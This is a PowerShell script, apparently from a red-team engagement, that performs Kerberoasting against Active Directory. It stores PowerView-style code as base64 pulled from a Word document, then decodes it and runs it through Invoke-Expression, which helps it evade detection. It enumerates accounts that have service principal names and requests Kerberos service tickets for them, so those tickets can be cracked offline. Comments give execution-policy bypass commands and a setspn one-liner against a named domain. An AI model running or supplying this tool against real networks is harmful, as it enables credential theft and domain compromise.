 param (
    [Parameter(Mandatory=$true)]$pv_file ,
	[string]$convert = "0",
	[string]$word_file = "",
	[string]$execute = "0",
	[string]$execute_command = "",
	[string]$temp_path= ""
 )
 
#COMPLETE AUTOMATION INBUILD :
#PS C:\> Add-Type -AssemblyName System.IdentityModel  
#PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  

function Convert-b64
{
$wd = New-Object -com word.application
$docu = $wd.Documents.Open($word_file)
$data=$docu.Range().text
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
$EncodedText =[Convert]::ToBase64String($Bytes)
$docu.close()
echo $EncodedText > $pv_file
}

#Convert-b64

function Exe-b64
{
$data= (Get-Content $pv_file)
$plain=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($data))
iex $plain
echo "Testing Execution :"
if ($execute_command -ne "")
	{
		Invoke-Expression -Command $execute_command 
	}
else
	{
		$store_path=$temp_path + "temp_spn.txt"
		Invoke-Expression -Command "Get-NetUser -spn | select userprincipalname,serviceprincipalname | Ft -AutoSize | Out-String -Width 4096 > $store_path"
		$cont=Get-Content($store_path)
		$spn_upn=@{}
		for ($i = 4; $i -lt $cont.Count ; $i++) 
		{
			
			$c=$cont[$i].trim()
			$sp=$c.split()
			$upn=$sp[0]
			$spn=""
			for($j = 1 ; $j -lt $sp.Count; $j++)
			{
				if (($sp[$j] -ne "") -and ($sp[$j] -ne " "))
				{
					$spn=$spn + $sp[$j].replace("{","").replace("}","")
				}
			}
			$spn_upn[$upn]=$spn
			
			
			
			
		}
		Invoke-Expression -Command "Add-Type -AssemblyNAme System.IdentityModel"
		
		foreach ($key in $spn_upn.Keys) 
			{
				echo "TRYING  UPN KEY : $key"
				$spns=$($spn_upn.Item($key)).split(",")
				$set = @{}
				foreach ($spn_element in $spns) {
					#echo $spn_element.split(":")[0]
					$set[$spn_element.split(":")[0]]=$true
				}
				$badoutput="0"
				foreach($k in $set.Keys)
				{
					#echo "`t $k"
					$x=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $k -ErrorVariable badoutput
				}
				if ($badoutput -ne "0")
				{
					$badoutput="0"
					echo "`t Recievied Bad output for Key : $key - Now Trying UPN"
					$trimmed_upn=$key.split("@")[0]
					echo "`t Trying Trimmed UPN : $trimmed_upn"
					$y=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $trimmed_upn  -ErrorVariable badoutput
					if ($badoutput -ne "0")
					{
						echo "`t Even after UPN recievied bad output for key : $key and Trimmed UPN : $trimmed_upn - Now ignoring"
					}
					else{
						echo "`t Modified UPN : $trimmed_upn - Saved TGS"
						}
				}
				else{
						echo "`t UPN : $key - Saved TGS"
				}
				#New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList -ErrorVariable badoutput
				#echo "UPN : $key => SPN : $($spn_upn.Item($key))"
			}
		
		
		#echo "Output is : " $op
	}	
}

if ($convert -eq "1")
{
	if ($word_file -ne "")
	{
		Convert-b64
		if (($execute -eq "1") )
		{
			Exe-b64
		}
		
	}
	else
	{
		echo "Please enter word file path !"
		return
	}
}

if (($execute -eq "1"))
{
			Exe-b64
}



#Convert-word
#Execute As below to Convert
#powershell -ep bypass -f .\Kerberost.ps1 -pv_file "D:\PT-Requests\PT-2020\Red-Teaming-AD\pv.txt" -convert "1" -word_file "D:\PT-Requests\PT-2020\Red-Teaming-AD\pv.docx"


#Execute As below to execute :

#powershell -ep bypass -f .\Kerberost.ps1 -pv_file "D:\PT-Requests\PT-2020\Red-Teaming-AD\pv.txt" -execute "1"

#Execute command with custom command :

#powershell -ep bypass -f .\Kerberost.ps1 -pv_file "D:\PT-Requests\PT-2020\Red-Teaming-AD\pv.txt" -execute "1" -execute_command "Get-NetUser dufk7471 | select userprincipalname"


